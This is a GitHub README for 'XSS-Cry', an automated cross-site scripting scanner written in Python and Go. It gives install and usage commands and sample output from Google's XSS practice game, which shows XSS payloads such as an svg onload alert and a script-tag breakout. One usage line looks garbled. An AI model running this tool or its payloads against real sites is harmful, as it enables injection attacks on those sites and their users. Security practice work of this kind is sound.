# XSS-Cry
```
 _  _  ___  ___        ___  ____  _  _ 
( \/ )/ __)/ __) ___  / __)(  _ \( \/ )
 )  ( \__ ||__ \(___)( (__  )   / \  / 
(_/\_)(___/(___/      \___)(_)\_) (__) 
```
<br>
Practice Automated Cross-Site-Scriptin(XSS) attacks and injection with xss cry a script made from golang and python to automate XSSI getting post form req's and more
# usages and installs 
<br>
`install: git clone https://github.com/ArkAngeL43/XSS-Cry.git ; chmod +x ./install.sh ; ./install.sh`
<br>
`syntax: python3 xssi.py <url> <payload file>`
<br>
if you do not have an extra file or a file of payloads you can use the defualt xss.txt file like this 
`synL python3 xssi.py figlet parrots recon installer -f slant`
<br>
# xss output 

```

 _  _  ___  ___        ___  ____  _  _ 
( \/ )/ __)/ __) ___  / __)(  _ \( \/ )
 )  ( \__ ||__ \(___)( (__  )   / \  / 
(_/\_)(___/(___/      \___)(_)\_) (__) 
──────────────────────────────────────
    
[*] Socket Form -> xss-game.appspot.com
[*] Socket Name -> 172.217.3.84
[*] Regexed URL -> https://xss
[*] Started At  : 2021-10-24 21:10:23.802164
────────────────────────────────────────────
[*] Gathering X-Frame request headers......

[+] Response Status  ->  200 OK
[+] Date Of Request  ->  Mon, 25 Oct 2021 05:10:24 GMT
[+] Content-Encoding ->  
[+] Content-Type     ->  text/html; charset=utf-8
[+] Connected-Server ->  Google Frontend
[+] X-Frame-Options  ->  
[+] -> Content-Type -> [text/html; charset=utf-8]
[+] -> Cache-Control -> [no-cache]
[+] -> X-Xss-Protection -> [0]
[+] -> X-Cloud-Trace-Context -> [cc601b10861c59adea7166efa4ba77bb;o=1]
[+] -> Date -> [Mon, 25 Oct 2021 05:10:24 GMT]
[+] -> Server -> [Google Frontend]
[+] -> Alt-Svc -> [h3=":443"; ma=2592000,h3-29=":443"; ma=2592000,h3-Q050=":443"; ma=2592000,h3-Q046=":443"; ma=2592000,h3-Q043=":443"; ma=2592000,quic=":443"; ma=2592000; v="46,43"]
[+] -> Vary -> [Accept-Encoding]
Scheme        --->  https
Hostname      --->  xss-game.appspot.com
Path in URL   --->  /level1/frame
Query Strings --->  
Fragments     --->  
map[]
Detected Payloads in file ->  7136
----------------------------------------------
[+] Utilizing Defualt xss script -> {payload}
[+] Targeting URL -> https://xss-game.appspot.com/level1/frame
[+] Time Started  -> 2021-10-24 21:10:34.466050
[~] Testing Payload -> 1 : 'onload=alert(1)><svg/1='
[+] XSSI Returned True At -> 2021-10-24 21:10:36.832116
[+] XSS Detected -> https://xss-game.appspot.com/level1/frame
 +--------------------------------------------------------------------------------------------------------------------------------------------------------+
|                                                                Content and form details                                                                |
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
| {'action': '', 'method': 'get', 'inputs': [{'type': 'text', 'name': 'query', 'value': "'onload=alert(1)><svg/1='"}, {'type': 'submit', 'name': None}]} |
+--------------------------------------------------------------------------------------------------------------------------------------------------------+
[~] Testing Payload -> 1 : '>alert(1)</script><script/1='
[+] XSSI Returned True At -> 2021-10-24 21:10:37.168141
[+] XSS Detected -> https://xss-game.appspot.com/level1/frame
```
# libs and langs <br>
Python, Go-Lang <br>
`libs: socket, colorama, bs4, urlparse, readlines, argparse, requests, pprint, tabulate | go -> aura, and go-query`
